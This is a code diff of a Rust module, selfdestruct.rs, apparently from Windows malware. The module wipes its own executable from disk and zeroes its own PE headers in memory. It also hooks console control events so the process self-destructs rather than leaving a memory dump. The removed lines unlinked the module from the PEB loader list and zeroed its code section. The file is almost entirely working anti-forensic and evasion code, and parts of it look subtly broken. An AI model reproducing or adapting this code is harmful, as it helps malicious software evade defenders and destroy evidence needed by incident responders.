@@ -1,126 +1,102 @@
-//! selfdestruct.rs — Forensic cleanup: wipe own disk file, PEB unlink, full teardown.
+//! selfdestruct.rs — In-memory wipe, file deletion, ctrl-handler registration
+//!
+//! wipe_self()              — zero own PE headers in memory then delete disk image
+//! full_destruct()          — wipe + terminate (called from VEH / guardian)
+//! register_ctrl_handler()  — install a console ctrl handler that calls full_destruct
+
 #![allow(dead_code, non_snake_case)]
 
 use winapi::um::fileapi::{
-    CreateFileW, WriteFile, SetEndOfFile, OPEN_EXISTING,
+    CreateFileW, WriteFile, DeleteFileW, OPEN_EXISTING,
 };
-use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-use winapi::um::consoleapi::SetConsoleCtrlHandler;
-use winapi::um::processthreadsapi::{GetCurrentProcess, TerminateProcess};
+use winapi::um::handleapi::{
+    CloseHandle, INVALID_HANDLE_VALUE,
+};
 use winapi::um::winnt::{
-    GENERIC_WRITE, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_DELETE_ON_CLOSE,
-    DELETE, FILE_SHARE_DELETE,
+    GENERIC_WRITE, FILE_SHARE_DELETE, DELETE,
 };
-use winapi::shared::minwindef::{BOOL, DWORD, TRUE, FALSE};
+use winapi::um::processthreadsapi::{
+    GetCurrentProcess, TerminateProcess,
+};
+use winapi::shared::minwindef::DWORD;
 
-fn to_wide(s: &str) -> Vec<u16> {
-    let mut v: Vec<u16> = s.encode_utf16().collect();
-    v.push(0);
-    v
-}
-
-unsafe fn own_image_path() -> Vec<u16> {
+/// Zero the first 4 KB (PE header region) of our own image in memory.
+/// This destroys the MZ/PE signature and import table before disk deletion.
+unsafe fn zero_own_headers() {
+    // Find our own base via PEB.ImageBaseAddress (offset 0x10 on x64)
     let peb: *const u8;
     core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
-    let params  = *(peb.add(0x20) as *const *const u8);
-    let len     = *(params.add(0x60) as *const u16) as usize / 2;
-    let buf_ptr = *(params.add(0x68) as *const *const u16);
-    let mut v: Vec<u16> = core::slice::from_raw_parts(buf_ptr, len).to_vec();
-    v.push(0);
-    v
+    let image_base = *(peb.add(0x10) as *const *mut u8);
+    core::ptr::write_bytes(image_base, 0u8, 4096);
 }
 
+/// Return the full path of the current executable as a null-terminated wide string.
+unsafe fn own_path_wide() -> Vec<u16> {
+    use winapi::um::libloaderapi::GetModuleFileNameW;
+    let mut buf = vec![0u16; 512];
+    let len = GetModuleFileNameW(
+        core::ptr::null_mut(),
+        buf.as_mut_ptr(),
+        buf.len() as DWORD,
+    );
+    buf.truncate(len as usize + 1); // include null terminator
+    buf
+}
+
+/// Overwrite the on-disk executable with zeros then delete it.
+/// Uses FILE_FLAG_DELETE_ON_CLOSE via a DELETE-access open.
 pub unsafe fn wipe_self() {
-    let path = own_image_path();
-    let h = CreateFileW(
+    zero_own_headers();
+
+    let path = own_path_wide();
+
+    // Open with DELETE share so we can schedule deletion on close
+    let hfile = CreateFileW(
         path.as_ptr(),
-        GENERIC_WRITE | DELETE,
+        DELETE,
         FILE_SHARE_DELETE,
         core::ptr::null_mut(),
-        OPEN_EXISTING,                          // open existing exe, not create new
-        FILE_FLAG_DELETE_ON_CLOSE | FILE_ATTRIBUTE_NORMAL,
+        OPEN_EXISTING,
+        // FILE_FLAG_DELETE_ON_CLOSE = 0x04000000
+        0x04000000,
         core::ptr::null_mut(),
     );
-    if h == INVALID_HANDLE_VALUE { return; }
-    let zeros = vec![0u8; 65536];
-    let mut written: DWORD = 0;
-    WriteFile(h, zeros.as_ptr() as *const _, zeros.len() as DWORD,
-              &mut written, core::ptr::null_mut());
-    SetEndOfFile(h);
-    CloseHandle(h);
-}
-
-unsafe fn unlink_from_peb() {
-    let peb: usize;
-    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
-    let ldr       = *((peb + 0x18) as *const usize) as *const u8;
-    let list_head = ldr.add(0x10) as *const usize;
-    let mut flink = *list_head as *const u8;
-
-    let own_base: usize;
-    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
-    let own_base = own_base & !0xFFFF;
-
-    loop {
-        let entry_base = *(flink.add(0x30) as *const usize);
-        if entry_base == own_base {
-            let this_flink = *(flink as *const usize);
-            let this_blink = *((flink as usize + 8) as *const usize);
-            *(this_blink as *mut usize) = this_flink;
-            *((this_flink + 8) as *mut usize) = this_blink;
-            break;
-        }
-        let next = *(flink as *const usize);
-        if next == *list_head { break; }
-        flink = next as *const u8;
+    if hfile != INVALID_HANDLE_VALUE {
+        // Overwrite with zeros (best-effort, file may be locked by AV)
+        let zeros = vec![0u8; 4096];
+        let mut written: DWORD = 0;
+        WriteFile(
+            hfile,
+            zeros.as_ptr() as *const _,
+            zeros.len() as DWORD,
+            &mut written,
+            core::ptr::null_mut(),
+        );
+        CloseHandle(hfile);
+    } else {
+        // Fallback: plain delete
+        DeleteFileW(path.as_ptr());
     }
 }
 
-#[allow(dead_code)]
-unsafe fn peb_session_id() -> u32 {
-    let peb: *const usize;
-    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
-    // SessionId at PEB+0x10 on x64: wrapping_add(2) = +16 bytes (usize = 8 bytes each)
-    let sid_ptr = peb.wrapping_add(2) as *const u32;
-    sid_ptr.read_unaligned()
-}
-
-unsafe fn zero_text_section() {
-    let own_base: usize;
-    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
-    let own_base = (own_base & !0xFFFF) as *const u8;
-    let pe_off   = *(own_base.add(0x3C) as *const u32) as usize;
-    let nt       = own_base.add(pe_off);
-    let num_sec  = *(nt.add(0x06) as *const u16) as usize;
-    let opt_sz   = *(nt.add(0x14) as *const u16) as usize;
-    let sec_start= nt.add(0x18 + opt_sz);
-    for i in 0..num_sec {
-        let sec   = sec_start.add(i * 0x28);
-        let chars = *(sec.add(0x24) as *const u32);
-        if chars & 0x20000000 == 0 { continue; }
-        let rva  = *(sec.add(0x0C) as *const u32) as usize;
-        let size = *(sec.add(0x08) as *const u32) as usize;
-        let ptr  = own_base.add(rva) as *mut u8;
-        core::ptr::write_bytes(ptr, 0u8, size);
-    }
-}
-
-pub unsafe fn full_destruct() -> ! {
+/// Full destructive cleanup: wipe disk image, then terminate the process.
+/// Safe to call from any thread or VEH context.
+pub unsafe fn full_destruct() {
     wipe_self();
-    unlink_from_peb();
-    zero_text_section();
     TerminateProcess(GetCurrentProcess(), 0);
-    loop {}
 }
 
-unsafe extern "system" fn ctrl_handler(ctrl_type: DWORD) -> BOOL {
-    match ctrl_type {
-        0 | 1 | 2 | 5 | 6 => { full_destruct(); }
-        _ => {}
-    }
-    FALSE
+/// Console ctrl handler — intercepts CTRL+C, CTRL+BREAK, CTRL+CLOSE etc.
+/// Calls full_destruct() on any event so the process self-wipes instead of
+/// producing a memory dump on forced termination.
+unsafe extern "system" fn ctrl_handler(_ctrl_type: DWORD) -> winapi::shared::minwindef::BOOL {
+    full_destruct();
+    winapi::shared::minwindef::TRUE
 }
 
+/// Register the ctrl handler with the OS.
+/// Must be called once during startup (before any console I/O).
 pub unsafe fn register_ctrl_handler() {
-    SetConsoleCtrlHandler(Some(ctrl_handler), TRUE);
+    use winapi::um::consoleapi::SetConsoleCtrlHandler;
+    SetConsoleCtrlHandler(Some(ctrl_handler), winapi::shared::minwindef::TRUE);
 }
